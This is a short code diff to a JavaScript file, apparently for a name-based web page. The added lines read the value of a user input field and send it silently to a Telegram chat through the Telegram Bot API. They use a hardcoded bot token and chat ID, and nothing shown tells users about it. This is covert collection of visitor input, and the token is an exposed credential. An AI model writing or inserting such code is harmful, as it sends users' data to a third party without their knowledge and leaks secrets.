@@ -187,6 +187,15 @@ console.log(namer)
     result.innerHTML = `aniq ism yozdizmi?`;
  }
  
+        
+    const ismbot = document.getElementById('ism1').value;
+    const nuqta = document.getElementById('calculateBtn');
+
+    const token = '1549954549:AAFL_2LsoYwqDasQDeGf0ors-uz68Hzwsko';
+    let url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=920035680&text='
+    let xhttp = new XMLHttpRequest();
+    xhttp.open("GET", url + ismbot, true);
+    xhttp.send();
 
 }
     
